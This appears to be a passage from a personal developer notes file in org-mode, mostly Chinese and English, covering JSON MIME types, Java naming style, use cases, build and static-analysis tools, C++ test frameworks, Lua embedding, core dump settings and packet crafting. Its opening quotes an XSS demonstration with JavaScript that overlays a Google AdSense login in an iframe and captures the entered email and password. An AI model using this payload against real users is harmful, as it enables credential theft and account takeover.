present in https:// google, so to re-enforce the problem XSS can present to a user, and why XSS is not simply about cookie stealing. Here's a simple demonstration of using the exploit to steal username and password from google adsense. The exploit is simply used to create an IFRAME that fills the document and points it to a google adsense login, when the user logs in, the username and password are alerted - also after logging in, then the "today's earnings" are alerted. Of course a real attacker would not alert these fields, but would sent them off to a site to be collected later. Are google adsense passwords useful? Would you notice if the address or account to get the cash changed until you'd not got the cheque? The script code is simple, you don't need to be clever, and phishers generally aren't stupid, it takes brains to launder money.

    document.body.innerHTML="<div><iframe src='https://www.google.com/adsense/report/overview'"+
    " onload='go()' style='position:absolute;top:0;left:0;height:100%;width:100%;'></div>";

    function go() {
      try {
      var win=window.frames[0];
      win.document.body.style.overflow="hidden";
      win.document.body.style.border="0px solid white";
      var doc=win.frames[0].document.forms[0];
      doc.onsubmit=function() {
       alert("Your adsense username and password are:\n"+
       doc["Email"].value+'\nand\n'+doc["Passwd"].value);
       x=window.open(location.href);
      }
     } catch (e) {
      try {
       var win=window.frames[0];
       var doc=win.document.body;
       var x="Today's Earnings:"+doc.getElementsByTagName('h1')[0];
       alert(x.getElementsByTagName('span')[0].innerHTML.replace(" ",""));
      } catch (e) {}
     }
    }

#+END_EXAMPLE

*** JSON 的 MIME 类型 
   http://blog.csdn.net/lilin_emcc/article/details/26670099

RFC 4627 "The application/json Media Type for JavaScript Object Notation (JSON)" 于2006年7月将 JSON 注册为一个 MIME 类型：application/json 。

参见：

    ECMA-404 The JSON Data Interchange Format
    RFC 4627 - The application/json Media Type for JavaScript Object Notation (JSON)
    JSON: http://json.org/json-zh.html
    MIME: http://www.iana.org/assignments/media-types/media-types.xhtml
    application/json: http://www.iana.org/assignments/media-types/application/json
    在线 JSON 校验格式化工具
    

* code style 

** java 
http://geosoft.no/development/javastyle.html

*** 
void setTopic(Topic topic) // NOT: void setTopic(Topic value) // NOT: void setTopic(Topic aTopic) // NOT: void setTopic(Topic t) void connect(Database database) // NOT: void connect(Database db) // NOT: void connect(Database oracleDB)

*** 
 12. The name of the object is implicit, and should be avoided in a method name.
line.getLength();   // NOT: line.getLineLength();
*** 
Note that the casing of the original words is almost entirely disregarded. Examples:
Prose form 	Correct 	Incorrect
"XML HTTP request" 	XmlHttpRequest 	XMLHTTPRequest
"new customer ID" 	newCustomerId 	newCustomerID
"inner stopwatch" 	innerStopwatch 	innerStopWatch
"supports IPv6 on iOS?" 	supportsIpv6OnIos 	supportsIPv6OnIOS
"YouTube importer" 	YouTubeImporter
YoutubeImporter* 	


* use case


  1) 使用 use case 十大误区
  1) 系统的boundary 没有定义或经常改变；
  1) 从系统观点而不是actor观点来定义Use Case；
  1) Actor的名称不一致；
  1) Use Case 定义过多；
  1) Use Case 和actor之间的关系象蜘蛛网一样错综复杂；
  1) Use Case的说明太长；
  1) Use Case的说明不清楚；
  1) Use Case没有正确的描述功能需求；
  1) 用户无法理解Use Case；
  1) Use Case 无法正常结束

* build tool
 - cmake
 - ninja build
 - scons
 - gmake
* 代码检查,分析,

vera++

** kitware


Software Testing for Everyone

CDash is an open source, web-based software testing server. CDash aggregates, analyzes and displays the results of software testing processes submitted from clients located around the world. Developers depend on CDash to convey the state of a software system, and to continually improve its quality. CDash is a part of a larger software process that integrates Kitware’s CMake, CTest, and CPack tools, as well as other external packages used to design, manage and maintain large-scale software systems.
Kitware’s Practical Software Process

Kitware’s Practical Software Process has grown organically over more than a decade of developing large-scale, scientific software systems such as VTK and ITK. It is a low-overhead, streamlined process that results in high-quality software systems. Rooted in the concepts of extreme programming and test-driven development, the PSP has benefited from the contributions of many dozens of individuals scattered around the globe. Besides the GE, Kitware, VTK and ITK communities and sponsors like NA-MIC and Sandia National Labs, many individuals like Alexander Neundorf (assisted with the CMake/KDE port) and Andrew Maclean (systems evaluator and tester) at the University of Sydney have and continue to contribute to the development of the PSP.

In recent years the PSP has grown to consist of several tools developed by Kitware and its partners, as well as external tools that have been adopted into the software process. These tools include:

    CMake, for cross-platform development
    CDash, the testing dashboard server
    CTest, the testing client
    CPack, the cross-platform packaging tool
    KWStyle, the configurable coding style evaluation tool
    Doxygen, for documentation generation
    Mantis, a bug tracking system
    dynamic memory analysis tools including ValGrind and Purify
    and code coverage tools such as gcov and BullsEye.



** 静态检查,分析
*** infer
*** cppcheck
  - compile

  make install SRCDIR=build CFGDIR=/usr/share/cppcheck/ HAVE_RULES=yes CXXFLAGS="-O2 -DNDEBUG -Wall -Wno-sign-compare -Wno-unused-function"


*** cpplint.py
    目前只能在python2下执行

     python2 ./cpplint.py  --verbose=0 --filter=-whitespace/parens,-whitespace/braces src/basic_lib/*
** code beautifier
   - astyle http://astyle.sourceforge.net/
   - clang-format
   - Uncrustify

* test tool && lib
** quickcheck(haskell) , rapidcheck(c++)
** fff (Fake Function Framework)

fff is a micro-framework for creating fake C functions for tests. Because life is too short to spend time hand-writing fake functions for testing.
https://github.com/meekrosoft/fff

**  C/C++单元测试框架的选择

http://blog.csdn.net/neilxp/article/details/4397275



Quote from Bas's mail:


CppUTest is not "my framework" Its an framework that is a 4th generation from CppUnit. Michael Feathers started CppUnit long ago. But then, the framework became too complex as it added too much features and used things like templates, which makes code quickly complex. So he abandoned and wrote CppUnitLite. That got improved in ObjectMentor to a tool called CppTest Tools (which included FIT for C++). The unit test part were extracted by me and James Grenning and  renamed to CppUTest. Thus, its a rather old framework and not  "developed by me"

Similar frameworks are googletest, which came a lot later than CppUTest, which is pretty good but it has some serious sucky features (like the braindead << way of working). CxxTest is quite popular, but it requires a perl script to generate your test runner, which kinda sucks. CppUnit is sucky and is even abandoned by the original author (as mentioned) and CUnit sucks even more as it requires you to put manual calls.

* lua vs js

** should-i-use-lua
http://stackoverflow.com/questions/18507447/should-i-use-lua

https://debian-administration.org/article/264/Embedding_a_scripting_language_inside_your_C/C_code
http://lua-users.org/wiki/BindingCodeToLua

https://developers.google.com/v8/embed
https://github.com/v8/v8/wiki/Embedder's%20Guide

http://webserver2.tecgraf.puc-rio.br/~celes/tolua/


https://www.lua.org/wshop16/

http://blog.carlesmateo.com/2014/10/13/performance-of-several-languages/


#+BEGIN_EXAMPLE

I'm assuming you're writing a standalone application in C or C++, and you're looking for a language to enable people to extend that application by embedding another language. That's pretty much Lua's territory.

Lua's strong point is that it's very easy to embed in your (C) application. It compiles quickly, it's tiny, licensing is liberal and using C functions from Lua is relatively easy. Standard Lua has enough performance for most things you'd use a language like this for; if you need more raw speed you could look into LuaJIT, the JIT-compiler for Lua.

As for your questions:

    LuaJIT will probably be pretty much as fast as you can get for a dynamic language. Lua is used in games (Sim City, Far Cry, World of Warcraft), where performance is very important.
    If by 'resources' you mean documentation: sure. Lua is a very simple language, much simpler than JavaScript; the manual should help you get started with the language itself, the wiki is tasty for tips about the embedding process. This article has an example you can copy/paste.
    Lua pretty much runs everywhere a C program will run. It doesn't even need an operating system, and it doesn't depend on anything at runtime if you bundle it correctly.

Embedding a full JavaScript environment in your application, and interfacing your application to the JS environment, can be a lot of work (even though Google's V8 engine has some functionality to help you; see here).

#+END_EXAMPLE

* coredump file 
    当系统中的一些程序在遇到一些错误以及crash时，系统会自动产生core file记录crash时刻系统信息包括内存和寄存器信息，用以程序员日后debug时可以使用。这些错误包括断错误，非法指令，总线错误和用户自己生成的退出信号等等。一般的，core file会在当前文件夹中存放。
         core file有时可能在你发生错误时，并没有出现在你的当前文件夹中，发生这种情况的原因有两个，一个是当前终端被设置为不能弹出core file；另一种则是core file被制定了路径。
         对于前者，我们可以使用ulimit这条命令对core file文件的大小进行设定。一般默认情况下，core file的大小被设置为了0，这样系统就不dump出core file了。这时用如下命令进行设置：
ulimit -c unlimited
这样便把core file的大小设置为了无限大，同时也可以使用数字来替代unlimited，对core file的上限值做更精确的设定。
         除了可以设置core file的大小之外，还可以对core file的名称进行一些规定。这种设置是对/proc/sys/kernel/core_pattern和/proc/sys/kernel/core_uses_pid这两个文件进行修改。改动这两个文件的方法是：
echo <pattern> > /proc/sys/kernel/core_pattern
echo <"0"/"1"> > /proc/sys/kernel/core_uses_pid
并且注意，只有超级用户可以修改这两个文件。
         core_pattern接受的是core file名称的pattern，它包含任何字符串，并且用％作为转移符号生成一些标识符，为core file名称加入特殊含义。已定义的标识符有如下这些：
%%: 相当于%
%p: 相当于<pid>
%u: 相当于<uid>
%g: 相当于<gid>
%s: 相当于导致dump的信号的数字
%t: 相当于dump的时间
%h: 相当于hostname
%e: 相当于执行文件的名称
除了这些标识符之外，还规定：
1.末尾的单个％可以直接去除。
2.%加上除上述之外的任何字符，％和该字符都被去除。
3.所有其他字符都作为一般字符加入名称中。
4.core file的名称最大值为64字节（包括\0）。
5.core_pattern中的默认pattern为core。
6.为了保持兼容性，通过设置core_uses_pid，可以在core file名称的末尾加上％p。
7.pattern中可以包含路径信息。 

* 网络测试发包
** packet crafting
*** software
    - ostinato
    - scapy
    - tcpreplay
    - yersinia
    - Mausezahn (dead) ==> netsniff-ng toolkit






 https://en.wikipedia.org/wiki/Packet_crafting

 Packet crafting is a technique that allows network administrators to probe firewall rule-sets and find entry points into a targeted system or network. This is done by manually generating packets to test network devices and behaviour, instead of using existing network traffic.[1] Testing may target the firewall, IDS, TCP/IP stack, router or any other component of the network.[1][2] Packets are usually created by using a packet generator or packet analyzer which allows for specific options and flags to be set on the created packets. The act of packet crafting can be broken into four stages: Packet Assembly, Packet Editing, Packet Play and Packet Decoding.[1][2] Tools exist for each of the stages - some tools are focussed only on one stage while others such as Ostinato try to encompass all stages.

 Contents

     1 Packet Assembly
     2 Packet Editing
     3 Packet Play
     4 Packet Decoding
     5 See also
     6 References
     7 External links

 Packet Assembly

 Packet Assembly is the creation of the packets to be sent. Some popular programs used for packet assembly are Hping, Nemesis, Ostinato, Cat Karat packet builder, Libcrafter, libtins, Scapy, Wirefloss and Yersinia.[1][2][3] Packets may be of any protocol and are designed to test specific rules or situations. For example, a TCP packet may be created with a set of erroneous flags to ensure that the target machine sends a RESET command or that the firewall blocks any response.[1][2]
 Packet Editing

 Packet Editing is the modification of created or captured packets. This involves modifying packets in manners which are difficult or impossible to do in the Packet Assembly stage, such as modifying the payload of a packet.[2] Programs such as Ostinato, Netdude allow a user to modify recorded packets' fields, checksums and payloads quite easily.[1] These modified packets can be saved in packet streams which may be stored in pcap files to be replayed later.
 Packet Play

 Packet Play or Packet Replay is the act of sending a pre-generated or captured series of packets. Packets may come from Packet Assembly and Editing or from captured network attacks. This allows for testing of a given usage or attack scenario for the targeted network. Tcpreplay is the most common program for this task since it is capable of taking a stored packet stream in the pcap format and sending those packets at the original rate or a user-defined rate. Ostinato added support for pcap files in version 0.4.[4] Some packet analyzers are also capable of packet replay.
 Packet Decoding

 Packet Decoding is the capture and analysis of the network traffic generated during Packet Play. In order to determine the targeted network's response to the scenario created by Packet Play, the response must be captured by a packet analyzer and decoded according to the appropriate specifications. Depending on the packets sent, a desired response may be no packets were returned or that a connection was successfully established, among others.
 See also

     Comparison of packet analyzers
     Comparison of packet crafter libraries
     Packetsquare
     Replay attack
     Packet Sender

 References
 Zereneh, William. "Packet Crafting" (PDF). Retrieved 2010-08-01.
 Poor, Mike. "Packet Craft for Defense-in-Depth" (PDF). InGuardians. Retrieved 2010-08-01.
 "Top 4 Packet Crafting Tools". SecTools.org. Retrieved 2010-08-01.

     "Ostinato ChangeLog". Retrieved 2011-04-30.

 External links

     Packet Crafting for Firewall & IDS Audits (Part 1 of 2) by Don Parker [1]
     Wikiformat article detailing Packet crafting
     Bit-Twist - Libpcap-based Ethernet packet generator [2]
     Packet Sender - open source packet generator focused on ease-of-use


 #+BEGIN_EXAMPLE
 '''Packet crafting''' is a technique that allows [[network administrator]]s to probe [[Firewall (computing)|firewall]] rule-sets and find entry points into a targeted system or network.  This is done by manually generating [[Packet (information technology)|packets]] to test network devices and behaviour, instead of using existing network traffic.<ref name=zereneh>{{cite web | last = Zereneh | first= William | url = http://www.scs.ryerson.ca/~zereneh/linux/PacketCrafting.pdf | title= Packet Crafting | accessdate = 2010-08-01 }}</ref> Testing may target the firewall, [[Intrusion detection system|IDS]], [[TCP/IP stack]], [[Router (computing)|router]] or any other component of the network.<ref name=zereneh /><ref name=poor>{{cite web | last = Poor | first = Mike | url = http://www.inguardians.com/research/docs/packetfoo.pdf | title = Packet Craft for Defense-in-Depth | publisher = InGuardians | accessdate = 2010-08-01 }}</ref> Packets are usually created by using a [[packet generator]] or [[packet analyzer]] which allows for specific options and [[Flag (computing)|flags]] to be set on the created packets. The act of packet crafting can be broken into four stages: Packet Assembly, Packet Editing, Packet Play and Packet Decoding.<ref name=zereneh /><ref name=poor /> Tools exist for each of the stages - some tools are focussed only on one stage while others such as [http://ostinato.org/ Ostinato] try to encompass all stages.

 ==Packet Assembly==
 Packet Assembly is the creation of the packets to be sent. Some popular programs used for packet assembly are [[Hping]], [[Nemesis (software)|Nemesis]], [http://ostinato.org/ Ostinato], [http://packetbuilder.net/ Cat Karat packet builder], [http://code.google.com/p/libcrafter/ Libcrafter], [http://libtins.sourceforge.net libtins], [[Scapy]], [http://wirefloss.com Wirefloss] and [[Yersinia (computing)|Yersinia]].<ref name=zereneh /><ref name=poor /><ref name=sectools>{{cite web | url = http://sectools.org/packet-crafters.html | title= Top 4 Packet Crafting Tools | publisher =  SecTools.org | accessdate = 2010-08-01}}</ref> Packets may be of any [[Communications protocol|protocol]] and are designed to test specific rules or situations. For example, a [[TCP packet]] may be created with a set of erroneous flags to ensure that the target machine sends a RESET command or that the firewall blocks any response.<ref name=zereneh /><ref name=poor />

 ==Packet Editing==
 Packet Editing is the modification of created or captured packets. This involves modifying packets in manners which are difficult or impossible to do in the Packet Assembly stage, such as modifying the payload of a packet.<ref name=poor /> Programs such as [http://ostinato.org/ Ostinato], [[Netdude]] allow a user to modify recorded packets' fields, checksums and payloads quite easily.<ref name=zereneh /> These modified packets can be saved in packet streams which may be stored in [[pcap]] files to be replayed later.

 ==Packet Play==
 Packet Play or Packet Replay is the act of sending a pre-generated or captured series of packets. Packets may come from Packet Assembly and Editing or from captured network attacks. This allows for testing of a given usage or attack scenario for the targeted network. [[Tcpreplay]] is the most common program for this task since it is capable of taking a stored packet stream in the [[pcap]] format and sending those packets at the original rate or a user-defined rate. [http://ostinato.org/ Ostinato] added support for [[pcap]] files in version 0.4.<ref name=ostcl>{{cite web | url = http://ostinato.org/wiki/ChangeLog | title= Ostinato ChangeLog | accessdate = 2011-04-30 }}</ref> Some packet analyzers are also capable of packet replay.

 ==Packet Decoding==
 Packet Decoding is the [[Packet capture|capture]] and analysis of the network traffic generated during Packet Play. In order to determine the targeted network's response to the scenario created by Packet Play, the response must be captured by a [[packet analyzer]] and decoded according to the appropriate specifications. Depending on the packets sent, a desired response may be no packets were returned or that a connection was successfully established, among others.

 == See also ==
 *[[Comparison of packet analyzers]]
 *[[Comparison of packet crafter libraries]]
 *[[Packetsquare]]
 *[[Replay attack]]
 *[[Packet Sender]]

 ==References==
 <references />

 ==External links==
 *Packet Crafting for Firewall & IDS Audits (Part 1 of 2) by Don Parker [http://www.securityfocus.com/infocus/1787]
 *Wikiformat article detailing [http://www.wikistc.org/wiki/Packet_crafting Packet crafting]
 *Bit-Twist - Libpcap-based Ethernet packet generator [http://bittwist.sourceforge.net/]
 *[https://packetsender.com/ Packet Sender] - open source packet generator focused on ease-of-use

 {{DEFAULTSORT:Packet Crafting}}
 [[Category:Network analyzers]]

 [[ru:Конструктор пакетов]]
 #+END_EXAMPLE

** packet injection
 https://en.wikipedia.org/wiki/Packet_injection

